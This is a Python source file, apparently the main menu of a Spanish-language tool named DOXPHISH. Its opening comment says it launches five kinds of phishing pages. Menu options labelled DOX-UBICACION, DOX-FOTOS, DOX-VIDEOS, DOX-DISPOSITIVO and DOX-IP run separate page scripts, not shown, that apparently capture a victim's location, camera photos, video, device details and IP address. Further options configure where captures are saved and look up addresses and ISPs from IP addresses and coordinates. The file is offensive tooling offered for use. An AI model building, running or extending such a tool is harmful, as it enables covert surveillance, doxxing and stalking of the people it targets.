# como principiante en prgramacion con python, he creado esta herramineta donde puedes lanzar 5 diferentes tipos de phishing en tu equipo local, cada uno lo puedes configurar a tu gusto
import os

def get_dirname(find_file):
    ruta_absoluta = os.path.abspath(find_file)
    directname = os.path.dirname(ruta_absoluta)
    return directname

if os.getcwd() != get_dirname(__file__):
    print("DEBES ESTAR EN EL DIRECTORIO DE DOXPHISH PARA QUE NO TENGAS ERRORES")
    os.chdir(get_dirname(__file__))
try:
    import pystyle, requests, flask
except ModuleNotFoundError:
    os.system('pip install pystyle')
    os.system('pip install requests')
    os.system('pip install flask')
    
import platform
import sys
import time 
import random
import subprocess
import requests
import argparse

sys.path.append('modulo/')
from modulo import main_head, colorate_time, zph_style, ascii_randomly_time, box
from config import puertos, change_port, reiniciar_script, move_clear

sys.path.append('paginas/fotos')
import config_fotos
from templates.change_second import do_change

sys.path.append(get_dirname('paginas/videos/change_seconds.py'))
import change_seconds
import config_videos


red = "\033[91m"
green = "\033[92m"
yellow = "\033[93m"
blue = "\033[94m"
cyan = "\033[95m"
purple = "\033[96m"
reset = "\033[0m"

def obtener_informacion_coordenada(latitud, longitud):
    url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={latitud}&lon={longitud}"
    headers = {
       'User-Agent': 'MiAplicacion/1.0 (tuemail@dominio.com)'
    }
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        data = response.json()
        address = data.get('display_name', 'Información no disponible')
        print()
        zph_style.to_style("LA INFORMACION DE LAS COOREDENADAS: ")
        print(address)
    else:
        zph_style.error("ERROR AL CONSEGUIR LA INFORMACION")


def conseguir_info_ip(get_ip):                                                            
    url = f'http://ip-api.com/json/{get_ip}'
    respuesta = requests.get(url)
    data = respuesta.json()
    try:
        if data['status'] != 'success':
            zph_style.error("[!] ERROR... ")
        else:
            print("")
            zph_style.to_style("LA INFORMACION DE LA IP: ")
            print()
            info = f"""
{green}LA DIRECCION IP:{reset} {data['query']}
{green}PAIS:{reset} {data['country']}
{green}CIUDAD:{reset} {data['city']}
{green}PROOVEDOR:{reset} {data['isp']}
{green}CODIGO POSTAL:{reset} {data['zip']}
{green}REGION:{reset} {data['regionName']}
{green}LOCALIZACION:{reset} {data['lat']} {data['lon']}
{green}ZONA HORARIA:{reset} {data['timezone']}
            """
            print(info)
    except requests.exceptions.RequestException:
        zph_style.error(" [!] ERROR AL CONSEGUIR LA INFORMACION DEL IP...")


def clean_terminal():
    if platform.system() == "Linux":
        os.system('clear')
    else:
        os.system('cls')    
def basic_banners():
    clean_terminal()
    main_head.text_banner()
    main_head.logo_banner()
    main_head.author_text()

def opciones():
    options = """
 [01] DOX-UBICACION    [06] INFO-DE-IP 
 [02] DOX-FOTOS        [07] INFO-DE-UBICACION
 [03] DOX-VIDEOS       [08] REINICIAR
 [04] DOX-DISPOSITIVO
 [05] DOX-IP

""" 
    colorate_time(options)

    #Colorear aleratoriomente con los colores guardados en las var
    c_r = random.choice((green, blue, cyan, purple))
    print()
    print()
    zhsty = f""" {c_r}[{reset}10{c_r}] SALIR  [{reset}11{c_r}] CONFIGURAR"""
    for i in zhsty:
        print(i, end="", flush=True)
        time.sleep(0.01)

    print()

def main():
    while True:
        clean_terminal()
        main_head.text_banner()
        main_head.logo_banner()
        main_head.author_text()
        opciones()
        print()
        ask_main = input(zph_style.to_ask("ELIGE UNA OPCION"))
        
        if ask_main == "1" or ask_main == "01":
            while True:
                opciones_1 = """
 [01] LANZAR PHISHING
 [02] PONER IMAGEN DE FONDO                   
 \n"""
                basic_banners()
                box("DOX-UBICACION", 10)
                print()
                colorate_time(opciones_1)
                print()
                c_r = random.choice((green, blue, cyan, purple))
                print(f"""{c_r} [{reset}03{c_r}] REGRESAR AL MENU\n [{reset}04{c_r}] SALIR""")
                print()
                one_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
                if one_ask == "1":
                    try:
                        os.chdir('paginas')
                        os.chdir('ubicacion')
                        subprocess.run(["python","ubicacion.py"])
                    except subprocess.CalledProcessError:
                        zph_style.error("ERROR AL EJECUTAR EL ARCHIVO...")
                    except FileNotFoundError:
                        zph_style.error("NO SE HA ENCONTRADO EL ARCHIVO...")
                elif one_ask == "2":
                    sys.path.append('paginas/ubicacion')
                    from moverone import process_imageone
                    basic_banners()
                    print()
                    process_imageone()

                elif one_ask == "3":
                    main()
                elif one_ask == "4":
                    exit()
                else:
                    zph_style.error("INPUT INCORRECTO...")

        elif ask_main == "8":
            reiniciar_script()
        elif ask_main == "2" or ask_main == "02":
            while True:
                opciones_1 =f"""
 [01] LANZAR PHISHING
 [02] PONER IMAGEN DE FONDO
 [03] CONFIGURAR RUTA DE GUARDADO
 [04] CONFIGURAR SEGUNDOS AUTOMATICOS DE GUARDADO
                                                  
 \n"""
                basic_banners()
                box("DOX-FOTOS", 10)
                print()
                colorate_time(opciones_1)
                c_r = random.choice((green, blue, cyan, purple))
                print(f"""{c_r}[{reset}05{c_r}] REGRESAR AL MENU\n [{reset}06{c_r}] SALIR""")
                print()
                three_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
                if three_ask == "1":
                    try:
                        os.chdir('paginas')
                        os.chdir('fotos')
                        subprocess.run(["python","fotos.py"])
                    except subprocess.CalledProcessError:
                        zph_style.error("ERROR AL EJECUTAR EL ARCHIVO...")
                    except FileNotFoundError:
                        zph_style.error("NO SE HA ENCONTRADO EL ARCHIVO...")

                elif three_ask == "2":
                    sys.path.append('paginas/fotos')
                    from moverthree import process_imagethree
                    basic_banners()
                    print()
                    process_imagethree()

                elif three_ask == "3":
                    basic_banners()
                    print()
                    config_fotos.change_root()

                elif three_ask == "4":
                    basic_banners()
                    print()
                    zph_style.to_style("NO SE PERMITE NUMEROS DECIMALES COMO 1.0")
                    print()
                    do_change()
                elif three_ask == "5":
                    basic_banners()
                    main()
                elif three_ask == "6":
                    exit()
                else:
                    zph_style.error("INPUT INCORRECTO...")

        elif ask_main == "03" or ask_main == "3":
            while True:
                opciones_1 = """
 [01] LANZAR PHISHING
 [02] PONER IMAGEN DE FONDO
 [03] CONFIGURAR RUTA DE GUARDADO
 [04] CONFIGURAR SEGUNDOS DE GUARDADO

 \n"""
                basic_banners()
                box("DOX-VIDEOS", 10)
                print()
                colorate_time(opciones_1)
                c_r = random.choice((green, blue, cyan, purple))
                print(f"""{c_r}[{reset}05{c_r}] REGRESAR AL MENU\n [{reset}06{c_r}] SALIR""")
                print()
                four_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
                if four_ask == "1":
                    try:
                        os.chdir('paginas/videos')
                        subprocess.run(["python","videos.py"])
                    except subprocess.CalledProcessError:
                        zph_style.error("ERROR AL EJECUTAR EL ARCHIVO...")
                    except FileNotFoundError:
                        zph_style.error("NO SE HA ENCONTRADO EL ARCHIVO...")

                elif four_ask == "2":
                    basic_banners()
                    print()
                    sys.path.append("paginas/videos")
                    from moverfourth import process_imagefourth
                    process_imagefourth()

                elif four_ask == "3":
                    basic_banners()
                    config_videos.change_root()

                elif four_ask == "4":
                    basic_banners()
                    print()
                    zph_style.to_style("NO SE PERMITE NUMEROS DECIMALES COMO 1.0")
                    print()
                    change_seconds.make_change()

                elif four_ask == "5":
                    main()
                elif four_ask == "6":
                    exit()
                else:
                    zph_style.error("INPUT INCORRECTO...")
        
        
        elif ask_main == "4" or ask_main == "04":
            while True:
                opciones_1 = """
 [01] LANZAR PHISHING             
 [02] PONER IMAGEN DE FONDO 
\n"""
                basic_banners()
                box("DOX-DISPOSITIVO", 9)
                print()
                colorate_time(opciones_1)
                c_r = random.choice((green, blue, cyan, purple))
                print("\n")
                print(f"""{c_r} [{reset}03{c_r}] REGRESAR AL MENU\n [{reset}04{c_r}] SALIR""")
                print()
                sixth_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
                if sixth_ask == "1":
                    try:
                        os.chdir('paginas/dispositivo')
                        subprocess.run(["python", "dispositivo.py"])
                    except subprocess.CalledProcessError:
                        zph_style.error("ERROR AL EJECUTAR EL ARCHIVO...")
                    except FileNotFoundError:
                        zph_style.error("NO SE HA ENCONTRADO EL ARCHIVO...")
                elif sixth_ask == "2":
                    basic_banners()
                    print()
                    sys.path.append('paginas/dispositivo')
                    from moversixth import process_imagesixth
                    process_imagesixth()

                elif sixth_ask == "3":
                    main()
                elif sixth_ask == "4":
                    exit()
                else:
                    zph_style.error("INPUT INCORRECTO...")

        elif ask_main == "5" or ask_main == "05":
            while True:
                opciones_1 = """
 [01] LANZAR PHISHING
 [02] PONER IMAGEN DE FONDO
 \n"""
                basic_banners()
                box("DOX-IP", 13)
                print()
                colorate_time(opciones_1)
                c_r = random.choice((green, blue, cyan, purple))  
                print()
                print(f"""{c_r} [{reset}03{c_r}] REGRESAR AL MENU\n [{reset}04{c_r}] SALIR""")                
                print()
                fifth_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
                if fifth_ask == "1":
                    try:
                        os.chdir('paginas')
                        os.chdir('ip')
                        subprocess.run(["python","ip.py"])
                    except subprocess.CalledProcessError:
                        zph_style.error("ERROR AL EJECUTAR EL ARCHIVO...")
                    except FileNotFoundError:
                        zph_style.error("NO SE HA ENCONTRADO EL ARCHIVO...")
                elif fifth_ask == "2":
                    try:
                        basic_banners()
                        print()
                        sys.path.append('paginas/ip')

                        from moverfifth import process_imagefifth
                        process_imagefifth()
                       
                    except KeyboardInterrupt:
                        exit()

                elif fifth_ask == "3":
                    main()
                elif fifth_ask == "4":
                    exit()              
                else:
                    zph_style.error("INPUT INCORRECTO...")

        elif ask_main == "7" or ask_main == "07":
            while True:
                try:
                    basic_banners()
                    print()
                    zph_style.to_style("COPIAR LA LATITUD(lat),LONGITUD(lon)\n")
                    print()
                    ask_for_coordinates = input(zph_style.to_ask("INTRODUCE LA LAT Y LON"))
                    latitud, longitud = ask_for_coordinates.split(',')
                    obtener_informacion_coordenada(latitud, longitud)
                    print()
                    ask_for_exit = input(zph_style.to_ask("QUIERES SALIR?(s/n)"))
                    if ask_for_exit.lower() == "n":
                        pass
                    else:
                        main()

                except (TypeError, ValueError):
                    zph_style.error("COORDENADAS INVALIDAS...")

        elif ask_main == "11":
            while True:
                opciones_2 = """
 [01] CAMBIAR PUERTO GENERAL

\n"""
                basic_banners()
                colorate_time(opciones_2)
                print()
                print()
                c_r = random.choice((green, blue, cyan, purple))
                print(f"""{c_r} [{reset}02{c_r}] REGRESAR AL MENU\n [{reset}03{c_r}] SALIR""")
                print()
                two_ask = input(zph_style.to_ask("ELIGE UNA OPCION"))
                if two_ask == "1":
                    basic_banners()
                    try:
                        print()
                        zph_style.to_style("PUERTO PREDETERMINADO: ")
                        print(puertos())
                        print()
                        change_port()
                    except KeyboardInterrupt:
                        exit()    
                elif two_ask == "2":
                    main()
                elif two_ask == "3":
                    exit()
                else:
                    zph_style.error("INPUT INCORRECTO...")

        elif ask_main == "10":
            exit()

        elif ask_main == "6" or ask_main == "06":
            while True:
                try:
                    basic_banners()
                    print()
                    zph_style.to_style("PRESIONA (ENTER) PARA VER EL TUYO\n")
                    print()
                    ask_ip = input(zph_style.to_ask("INGRESA LA IP"))
                    conseguir_info_ip(ask_ip)
                    print()
                    ask_exit = input(zph_style.to_ask("QUIERES SALIR (S/N)"))
                    if ask_exit.lower() == "n":
                        pass
                    else:
                        main()

                except TypeError:
                    zph_style.error("IP INVALIDA...")

        else:
            zph_style.error("INPUT INCORRECTO...")

if __name__ == "__main__":
    try:
        main()
    except (KeyboardInterrupt, EOFError):
        exit()
